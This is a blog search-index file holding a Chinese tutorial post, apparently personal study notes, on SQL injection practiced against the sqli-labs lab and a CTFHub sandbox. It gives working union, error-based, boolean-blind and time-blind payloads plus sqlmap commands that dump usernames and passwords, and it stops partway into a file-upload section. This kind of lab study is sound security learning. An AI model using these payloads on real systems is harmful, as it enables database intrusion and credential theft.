<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>sql</title>
      <link href="/2024/03/02/sql/"/>
      <url>/2024/03/02/sql/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>1、查找注入点</p><p>2、判断是字符型还是数字型注入 </p><p>3、如果字符型，找到他的闭合方式</p><p>4、判断查询列数，group by 或 order by</p><p>5、查询回显位置 -1（id要是不存在的数据）</p><h2 id="注入分类"><a href="#注入分类" class="headerlink" title="注入分类"></a>注入分类</h2><ul><li><p>按照查询字段</p><ul><li>字符型:输入参数为整形</li><li>数字型:输入参数为字符型</li></ul></li><li><p>按照注入方法</p><ul><li>Union注入</li><li>报错注入</li><li>布尔注入</li><li>时间注入</li></ul></li></ul><h2 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h2><p>注入点就是可以实行注入的地方，通常是一个访问数据库的连接，如本页面的注入点input the ID</p><h3 id="Less1"><a href="#Less1" class="headerlink" title="Less1"></a>Less1</h3><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131141452662.png" alt="image-20240131141452662"></p><h2 id="如何判断是字符型还是数字型"><a href="#如何判断是字符型还是数字型" class="headerlink" title="如何判断是字符型还是数字型"></a>如何判断是字符型还是数字型</h2><p>实用and 1&#x3D;1 和and 1&#x3D;2来判断，数字型一般提交内容为数字，但数字不一定为数字型。</p><p>Less-1 提交and 1&#x3D;1和提交and 1&#x3D;2，如果是数字型，你1&#x3D;2就不会正常显示，是字符型则仍能正常显示，这里是字符型</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131142319694.png" alt="image-20240131142319694"></p><p>Less-2则是数字型了</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131142425527.png" alt="image-20240131142425527"></p><p>也可以直接用运算2-1如果显示的是2的数据则是字符型，注意+号会被认为是空格</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131142754670.png" alt="image-20240131142754670"></p><h2 id="闭合方式"><a href="#闭合方式" class="headerlink" title="闭合方式"></a>闭合方式</h2><p>一个单引号-‘</p><p>两个单引号’’</p><p>一个单引号’+)</p><p>两个单引号’’+)</p><p>或双引号</p><p>其他</p><h3 id="如何判断闭合方式"><a href="#如何判断闭合方式" class="headerlink" title="如何判断闭合方式"></a>如何判断闭合方式</h3><p>例如Less-1输入?id&#x3D;1’‘’报错为 near ‘’1’’’’ LIMIT 0,1多一个’闭合符为‘’,还有一个–+ 可以把面的内容注释掉</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131151415891.png" alt="image-20240131151415891"></p><p>在Less-3中先输入一个’会报错，可以看到有个括号,</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131151501215.png" alt="image-20240131151501215"></p><p>这时候可以括号闭合，再注释后面的内容</p><h3 id="闭合的作用"><a href="#闭合的作用" class="headerlink" title="闭合的作用"></a>闭合的作用</h3><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131151703697.png" alt="image-20240131151703697"></p><h2 id="Union联合注入"><a href="#Union联合注入" class="headerlink" title="Union联合注入"></a>Union联合注入</h2><p>提交：?id&#x3D;1’ union select database () –+</p><p>需要注意列数，可以先group by + 数字判断列数</p><p><a href="http://localhost/sqli-labs/Less-1/?id=1&#39;">http://localhost/sqli-labs/Less-1/?id=1&#39;</a> group by 4–+到四就报错了，说明有3列，用二分法就好了，还可以order by + 数字</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131152330244.png" alt="image-20240131152330244"></p><p><a href="http://localhost/sqli-labs/Less-1/?id=1&#39;">http://localhost/sqli-labs/Less-1/?id=1&#39;</a> union select 1,2,3–+</p><p>列数要一致，但有时候不一定都显示，所以我们需要放在可以显示的列，phpmyadmin没用了。。</p><p>select * from users where id&#x3D;’1’ union select 1,2,3;</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131153436408.png" alt="image-20240131153436408"></p><p>但页面只显示第一行，所以可以把id设置成-1</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131153600297.png" alt="image-20240131153600297"></p><p><a href="http://localhost/sqli-labs/Less-1/?id=-1&#39;">http://localhost/sqli-labs/Less-1/?id=-1&#39;</a> union select 1,2,database()–+</p><p>所以可以将3换成database()就可以查到库名了</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131212132753.png" alt="image-20240131212132753"></p><p>2也可以用，但1不行，因为1没有回显位，version()可以用来显示版本</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131212742386.png" alt="image-20240131212742386"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,version(),databse() --+</span><br></pre></td></tr></table></figure><p>页面只能显示一个内容,第二句的内容是不显示的，可以把第- -的内容改为数据库不存在的数据，如id&#x3D;0。</p><p>?id&#x3D;1’ union select 1,2,database() –+</p><h3 id="关键数据库、数据表、数据列、group-concat作用"><a href="#关键数据库、数据表、数据列、group-concat作用" class="headerlink" title="关键数据库、数据表、数据列、group_concat作用"></a>关键数据库、数据表、数据列、group_concat作用</h3><ul><li>数据库：Information_schema（包含所有mysql数据库的简要信息）<ul><li>数据表：tables<ul><li>表名集合表</li></ul></li><li>数据表：columns<ul><li>列名集合表</li></ul></li></ul></li></ul><p>但waf对这个有防御，不怎么容易用上</p><h3 id="查找表名"><a href="#查找表名" class="headerlink" title="查找表名"></a>查找表名</h3><p>走到确定回显位的时候</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,table_name,3 from information_schema.tables --+</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131214415498.png" alt="image-20240131214415498"></p><p>但里面数据这么多，这里只显示一个，所以需要限制条件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,table_name,3 from information_schema.tables where table_schema=database() --+</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131214715798.png" alt="image-20240131214715798"></p><p>也可以直接用刚刚得到的数据库名，但函数更好用一些，有的防火墙不一定过滤函数</p><p>但表名还是只能显示一个，这是时候就要用到**group_concat()**把多个列名合在一起</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</span><br></pre></td></tr></table></figure><p>把table_name作为参数放到group_concat()函数就可以了</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131215006002.png" alt="image-20240131215006002"></p><h3 id="查找列名"><a href="#查找列名" class="headerlink" title="查找列名"></a>查找列名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,column_name,3 from information_schema.columns --+</span><br></pre></td></tr></table></figure><p>同样的思路，最终语句如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=databse() and table_namme=&#x27;你需要的那个表&#x27;--+</span><br></pre></td></tr></table></figure><p>我这里以user表为例子</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; --+</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131221726938.png" alt="image-20240131221726938"></p><p>我们也可以在mysql里直接看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show columns from security.users;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131222241062.png" alt="image-20240131222241062"></p><p>确实是这三个</p><h3 id="查找最终目标"><a href="#查找最终目标" class="headerlink" title="查找最终目标"></a>查找最终目标</h3><p>查找里面的内容，比如我们要获取user表里的username和password，一样的思路</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,group_concat(username,password),3 from users --+</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131224502718.png" alt="image-20240131224502718"></p><p>聚在一起不好看，可以插入”~”区分数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,group_concat(username,&#x27;~&#x27;,password),3 from users --+</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131224606034.png" alt="image-20240131224606034"></p><h3 id="数字型union注入"><a href="#数字型union注入" class="headerlink" title="数字型union注入"></a>数字型union注入</h3><h4 id="总结流程"><a href="#总结流程" class="headerlink" title="总结流程"></a>总结流程</h4><ol><li>确定数字型还是字符型</li><li>使用group by的二分法判断union语句中前一个查询的列数</li><li>优化语句，将id改为一个不存在的数字</li><li>使用select语句，查询靶机数据库库名</li><li>使用select语句，查询靶机所有表名</li><li>使用select语句，查询靶机所有列名</li><li>查询所有用户名密码</li></ol><h3 id="拿Less2练练手"><a href="#拿Less2练练手" class="headerlink" title="拿Less2练练手"></a>拿Less2练练手</h3><p>一样，判断注入点？id&#x3D;1有回显</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131225137471.png" alt="image-20240131225137471"></p><p>然后id&#x3D;2-1判断类型</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131225153111.png" alt="image-20240131225153111"></p><p>结果和id&#x3D;1一样，所以是数字型，就不加’了，在最后加个#号注释即可，或–+，查列数id&#x3D;1 order by 3 –+，和之前一样是三列</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131225347565.png" alt="image-20240131225347565"></p><p>判断回显位置,这里就不用1，2，3了,注意id要是-1或者0</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1 union select 1,version(),database() --+</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131225633817.png" alt="image-20240131225633817"></p><p>知道回显位置后，查表名（库名知道了）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,group_concat(table_name),3 from information_schema.tables  where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131225915149.png" alt="image-20240131225915149"></p><p>查到表名再查列名，因为回显得是name和password，那就查这个，试试user表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,group_concat(column_name),3 from information_schema.columns  where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; --+</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131230226025.png" alt="image-20240131230226025"></p><p>结果一样的，没什么变化，再查具体信息,这里就不加~了，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,group_concat(username,password),3 from users --+</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131230324541.png" alt="image-20240131230324541"></p><p>差不多就是这样</p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240131232843853.png" alt="image-20240131232843853"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201151543752.png" alt="image-20240201151543752"></p><p>重要的是前三个，后面不怎么见到</p><h4 id="通过extractValue-报错注入"><a href="#通过extractValue-报错注入" class="headerlink" title="通过extractValue()报错注入"></a>通过extractValue()报错注入</h4><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201152540772.png" alt="image-20240201152540772"></p><p>这是数据库words中的一个表xml，里面有个doc字段为varchar(50),再插入两个xml代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into xml values(&#x27;&lt;book&gt;&lt;title&gt;A bad boy how to get agirlfriend&lt;/title&gt;&lt;author&gt;&lt;initial&gt;Love&lt;/initial&gt;&lt;surname&gt;benben&lt;/surname&gt;&lt;/author&gt;&lt;/book&gt;&#x27;);</span><br><span class="line">insert into xml values(&#x27;&lt;book&gt;&lt;title&gt;how to become a bad boy&lt;/title&gt;&lt;author&gt;&lt;initial&gt;hualong&lt;/initial&gt;&lt;surname&gt;Melton&lt;/surname&gt;</span><br><span class="line">&lt;/author&gt;</span><br><span class="line">&lt;/book&gt;&#x27;);</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201153602460.png" alt="image-20240201153602460"></p><p>下面事着查询一下作者是谁，extractValue有两个参数第一个是列名，后一个是路径</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select extractValue(doc,&#x27;/book/author/surname&#x27;) from xml;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201154031658.png" alt="image-20240201154031658"></p><p>查书名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select extractValue(doc,&#x27;/book/title&#x27;) from xml;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201154118824.png" alt="image-20240201154118824"></p><p>下面来看看报错，你目录里面错了几个字母，他只是找不到东西，而添加了其它符号，他就会返回错误信息，比如在前面加上~</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201154805130.png" alt="image-20240201154805130"></p><p>所以，在报错之前，让报错回显我们想要的信息，比如库名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select extractValue(doc,concat(0x7e,(select database()))) from xml;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201155248760.png" alt="image-20240201155248760"></p><p>拿Less-5试试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,extractvalue(1,concat(0x7e,(select database()))),3 --+</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201160031944.png" alt="image-20240201160031944"></p><p>id&#x3D;100’ and 1&#x3D;extractvalue(1,concat(0x7e,(select database())))–+，这种写法也可以，因为是报错回显，所以不用在意回显位置</p><p>要查表名的，则把databas()这个函数换掉即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201162001229.png" alt="image-20240201162001229"></p><p>再获取users里的列名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))) --+</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201162234530.png" alt="image-20240201162234530"></p><p>再获取列里需要的具体数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">extractvalue(1,concat(0x7e,(select group_concat(username,&#x27;~&#x27;,password) from users))) --+</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201162428529.png" alt="image-20240201162428529"></p><p>但数据不全，因为默认只能返回32个字节，所以可以在外面套个substring函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">extractvalue(1,concat(0x7e,(select substring(group_concat(username,&#x27;~&#x27;,password),25,30) from users))) --+</span><br></pre></td></tr></table></figure><p>表示从25往后再显示30个字符</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201162621595.png" alt="image-20240201162621595"></p><h4 id="uptatexml函数"><a href="#uptatexml函数" class="headerlink" title="uptatexml函数"></a>uptatexml函数</h4><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201162929770.png" alt="image-20240201162929770"></p><p>这个函数是三个参数的，原理和前面一样，也是把路径那个参数更改，第三个参数随便输个‘1’就行，下面拿Less-4来，这个是双引号+括号闭合的，先查查库名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;...?id=1&quot;) and 1=extractvalue(1,concat(0x7e,(select database()))) --+</span><br></pre></td></tr></table></figure><p>查完库名再查表名,注意一下括号匹配</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),3) --+</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201170838879.png" alt="image-20240201170838879"></p><p>查完表名查列名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database())),3) --+</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201171212580.png" alt="image-20240201171212580"></p><p>再查内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,(select group_concat(username,&#x27;~&#x27;,password) from users)),3) --+</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201171319765.png" alt="image-20240201171319765"></p><p>一样是32个字节，需要用substring来慢慢看</p><h4 id="floor报错"><a href="#floor报错" class="headerlink" title="floor报错"></a>floor报错</h4><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201172417362.png" alt="image-20240201172417362"></p><p>rand()默认是0-1</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201172638092.png" alt="image-20240201172638092"></p><p>rand()*2则是生成0-2的随机数，如果在后面加上表，则表中有多少行rand就执行多少次</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201173129418.png" alt="image-20240201173129418"></p><p>floor()向下取整，如果是rand()*2则是1或0</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201172711522.png" alt="image-20240201172711522"></p><p>ceiling()向上取整，和floor类似</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201172754797.png" alt="image-20240201172754797"></p><p>concat_ws()将第2，3两个参数用第一个参数连接起来，可以通过修改参数获得需要的信息</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201172851655.png" alt="image-20240201172851655"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--库名</span><br><span class="line">select concat_ws(&#x27;~&#x27;,1,(select database()));</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201173544763.png" alt="image-20240201173544763"></p><p>还可以把1换成floor(rand()*2),方便后续统计数量</p><p>group by</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select concat_ws(&#x27;~&#x27;,floor(rand()*2),(select database())) as ben from users group by ben;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201181152735.png" alt="image-20240201181152735"></p><p>count()统计数量</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select count(*),concat_ws(&#x27;~&#x27;,floor(rand()*2),(select database())) as ben from users group by ben;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201183140877.png" alt="image-20240201183140877"></p><p>数字会变化，但和不会，这个要全0全1</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201183215704.png" alt="image-20240201183215704"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201183240343.png" alt="image-20240201183240343"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201194213286.png" alt="image-20240201194213286"></p><p>在里面的数字，应该是随机数种子，确定后就不会变了，0是会报错的，有些又不会，就用0把</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201195528155.png" alt="image-20240201195528155"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201200009652.png" alt="image-20240201200009652"></p><p>往group_key写入数据时要重新进行计算，所以可能会导致重复</p><p>接下来试一试，基本就是把concat_ws的参数换成之前的代码，下面来看看表名，同样注意括号匹配,<strong>只要改concat_ws的参数即可，其它不用动</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,count(*),concat_ws(&#x27;-&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),floor(rand(0)*2)) as a from information_schema.tables group by a;--+</span><br></pre></td></tr></table></figure><p>还是挺长的<img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201201242950.png" alt="image-20240201201242950"></p><p>最终也是获得了表名，下面来获取列名，同样的操作，替换语句即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,count(*),concat_ws(&#x27;-&#x27;,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),floor(rand(0)*2)) as a from information_schema.columns group by a; --+</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201201455769.png" alt="image-20240201201455769"></p><p>下面查找字段</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,count(*),concat_ws(&#x27;-&#x27;,(select group_concat(username,&#x27;-&#x27;,password) from users),floor(rand(0)*2)) as a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201202207721.png" alt="image-20240201202207721"></p><p>没显示。。。，去掉group试试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,count(*),concat_ws(&#x27;-&#x27;,(select concat(username,&#x27;-&#x27;,password) from users),floor(rand(0)*2)) as a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201202329552.png" alt="image-20240201202329552"></p><p>加个限制一下,注意limit0,1指从0开始显示第1行，然后得加在修改得地方，其他地方不动，也可以用where id&#x3D;1，但有时候不一定又id这列，所以还是用第一种把</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,count(*),concat_ws(&#x27;-&#x27;,(select concat(username,&#x27;-&#x27;,password) from users limit 0,1),floor(rand(0)*2)) as a from information_schema.tables group by a --+</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201202511088.png" alt="image-20240201202511088"></p><p>但这个一行最多也是64个字节，如果太多可以加上substring，当然也是夹在修改得地方</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,count(*),concat_ws(&#x27;-&#x27;,substring((select concat(username,&#x27;-&#x27;,password) from users limit 0,1),2,4),floor(rand(0)*2)) as a from information_schema.tables group by a --+</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201202819263.png" alt="image-20240201202819263"></p><p>从第二个字符开始，显示4个字符</p><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201203121868.png" alt="image-20240201203121868"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201203311487.png" alt="image-20240201203311487"></p><p><strong>关键函数：ascii()</strong></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201203546134.png" alt="image-20240201203546134"></p><p>注意数字可以不带引号，字符需要加引号，字符串只显示第一个字符，所以我们需要用到substr函数，substr((),1,1)从第一个字符开始显示一个字符</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ascii(substr((select database()),1,1))&gt;=130--+</span><br></pre></td></tr></table></figure><p>就是根据数据库名各个字符的ascii值，通过用范围逼近确定是哪个字母，一位一位确定，是不是呢，则通过页面返回的状态来确定，传真和传假的页面是不同的，可以先确定一下。感觉好麻烦，还是用sqlmao把</p><p>然后要查表名的话就是替换select database()即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201230553330.png" alt="image-20240201230553330"></p><p>这里就不要group了，一张表一张表确定比较合理。所以加上limit 0，1。下限确定，再确定上限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;106 --+</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201230856011.png" alt="image-20240201230856011"></p><p>因为知道是e，所以直接试试&#x3D;把。。。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101 --+</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201231128541.png" alt="image-20240201231128541"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240201231213126.png" alt="image-20240201231213126"></p><p>补充sqlmap</p><p>查库</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://challenge-697209b99487bc8f.sandbox.ctfhub.com:10800?id=1&quot; --dbs  --batch</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240301225101809.png" alt="image-20240301225101809"></p><p>查表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://challenge-697209b99487bc8f.sandbox.ctfhub.com:10800?id=1&quot; -D sqli --tables  --batch</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240301225207030.png" alt="image-20240301225207030"></p><p>查列</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://challenge-697209b99487bc8f.sandbox.ctfhub.com:10800?id=1&quot; -D sqli -T flag --columns  --batch</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240301232736773.png" alt="image-20240301232736773"></p><p>查字段</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://challenge-697209b99487bc8f.sandbox.ctfhub.com:10800?id=1&quot; -D sqli -T flag -C flag --dump  --batch</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240301232805702.png" alt="image-20240301232805702"></p><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p><strong>关键函数：sleep 、if(condition,true,false)</strong></p><p>sleep挺多少秒，后面的if结合上一起看,就是前面的条件为真执行第二个函数，为假则执行最后一个，可以把sleep放在里面</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select if(2&gt;1,sleep(3),sleep(2));</span><br></pre></td></tr></table></figure><p>使用方式：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select if(ascii(substr((select database())&gt;100,1,1),sleep(0),sleep(3)) --+</span><br></pre></td></tr></table></figure><p>注入时建议先写参数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f(ascii(substr((select database()),1,1))&gt;100,sleep(0),sleep(3)) --+</span><br></pre></td></tr></table></figure><p>慢慢查库名，这里直接用&#x3D;了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(ascii(substr((select database()),1,1))=115,sleep(0),sleep(3))</span><br></pre></td></tr></table></figure><p>可以看到页面很快就刷新了。表名和列名则替换substr的第一个参数即可，和之前一样,记得加上 limit 0,1</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(0),sleep(3))--+</span><br></pre></td></tr></table></figure><p>查列名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1,1))=105,sleep(0),sleep(3))--+</span><br></pre></td></tr></table></figure><p>查字段</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(ascii(substr((select username from users limit 0,1),1,1))=105,sleep(0),sleep(3))--+</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240202171741470.png" alt="image-20240202171741470"></p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240202173217774.png" alt="image-20240202173217774"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variable like &#x27;%secure%&#x27;;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240202173059912.png" 